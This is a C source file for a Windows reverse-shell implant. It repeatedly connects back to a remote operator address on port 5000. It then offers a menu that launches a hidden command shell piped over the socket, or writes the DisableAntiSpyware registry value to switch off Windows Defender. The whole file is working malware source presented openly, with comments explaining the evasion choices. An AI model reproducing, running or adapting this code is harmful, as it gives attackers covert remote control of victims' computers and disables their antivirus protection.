#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS

#include <winsock2.h>
#include <ws2tcpip.h>
#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <process.h>


#define PORT "5000"

#define LOCALTEST

#ifdef LOCALTEST
#define ADDRESS "Local IP ADDR"
#else
#define ADDRESS "Public IP ADDR"
#endif

#define MESSAGESIZE 10000
#define RESPONSESIZE 20000
#pragma comment(lib, "Ws2_32.lib")

int main(int argc, char* argv[]);
SOCKET connectToServer();
void startShellProcess(SOCKET* pSockfd, PROCESS_INFORMATION* pPinfo);
void attemptDefeatDefender(SOCKET* pSockfd);
void cleanManagerInput(char* command, size_t size);

SOCKET connectToServer() {
	SOCKET sockfd;

	struct addrinfo hints, * p, * servinfo;
	memset(&hints, 0, sizeof hints);
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;

	getaddrinfo(ADDRESS, PORT, &hints, &servinfo);

	for (p = servinfo; p != NULL; p = p->ai_next) {

		if ((sockfd = WSASocketW(p->ai_family, p->ai_socktype, p->ai_protocol, NULL, 0, 0)) == -1) {
			// We don't want a null pointer
			if (p->ai_next == NULL) {
				break;
			}

			continue;
		} 

		break;
	}

	// We only loop here because we want to sleep on the connect, we will just hope the socket
	// WILL be good at some point (the connection manager is opened back home)

	while (connect(sockfd, p->ai_addr, p->ai_addrlen) != 0) {
		Sleep(5000);
	}

	return sockfd;
}

void startShellProcess(SOCKET* pSockfd, PROCESS_INFORMATION * pPinfo) {
	
	char shell[60];
	char message[] = "Shell type (ex. cmd): ";

	send(*pSockfd, message, sizeof message, 0);
	recv(*pSockfd, shell, sizeof shell, 0);

	// We need to clear the carriage return to call CreateProcessA
	cleanManagerInput(shell, (size_t)sizeof shell);

	STARTUPINFO sinfo;
	memset(&sinfo, 0, sizeof sinfo);
	sinfo.cb = sizeof sinfo;
	sinfo.hStdInput = (HANDLE)*pSockfd;
	sinfo.hStdOutput = (HANDLE)*pSockfd;
	sinfo.hStdError = (HANDLE)*pSockfd;
	sinfo.dwFlags = STARTF_USESTDHANDLES;

	// We can use the pointer to a pinfo struct to close the process and thread later (to exit the shell)
	CreateProcessA(NULL, shell, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, pPinfo);

	// This function is blocking, I couldn't find a good way of pulling out of the shell besides
	// killing it from within the shell, or creating another socket on another port which is yucky.
	WaitForSingleObject(pPinfo->hProcess, INFINITE);
}

// Attempts to place the "DisableAntiSpyware" key in the registry, stopping Windows Defender. Runs under process security context.
// Not sure how likely it is to have this running under admin without some serious maneuvering
void attemptDefeatDefender(SOCKET* pSockfd) {
	HKEY key;
	DWORD one = 0x00000001;
	char failed[] = "Failed to create new value.\n";
	char success[] = "Succeeded in creating registry value!\n";

	// Need to get a handle to the registry tree.
	if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows Defender", 0, KEY_WRITE, &key) != ERROR_SUCCESS) {
		send(*pSockfd, failed, sizeof failed, 0);
		return;
	}

	// Create the value
	if (RegSetValueExW(key, L"DisableAntiSpyware", 0, REG_DWORD, (LPBYTE)&one, sizeof(DWORD)) != ERROR_SUCCESS) {
		send(*pSockfd, failed, sizeof failed, 0);
		RegCloseKey(key);
		return;
	}

	RegCloseKey(key);

	send(*pSockfd, success, sizeof success, 0);
	return;
}

// Cleaning up some stuff
void cleanManagerInput(char* command, size_t size) {

	int i;
	for (i = 0; i < (size); ++i) {
		if (command[i] == '\r' || command[i] == '\n') {
			command[i] = 0;
		}
	}

}

int main(int argc, char* argv[]) {

	WSADATA WsaData;
	if (WSAStartup(MAKEWORD(2, 2), &WsaData) != 0) {
		printf("Error in WSAStartup.");
		ExitProcess(1);
	}

	SOCKET sockfd;

	char commandList[] = 
		"1. Drop into a shell\n"
		"2. Attempt to stop defender\n";
	
	char commandOpt[50];
	PROCESS_INFORMATION pinfo;

	if ((sockfd = connectToServer()) == -1) {
		ExitProcess(1);
	}

	while (1) {

		memset(commandOpt, 0, sizeof commandOpt);

		send(sockfd, commandList, sizeof commandList, 0);
		recv(sockfd, commandOpt, sizeof commandOpt, 0);

		cleanManagerInput(commandOpt, (size_t)sizeof commandOpt);

		if (strcmp(commandOpt, "1") == 0) {
			startShellProcess(&sockfd, &pinfo);
			continue;
		}

		if (strcmp(commandOpt, "2") == 0) {
			attemptDefeatDefender(&sockfd);
			continue;
		}

	}

	WSACleanup();

	return 0;
}
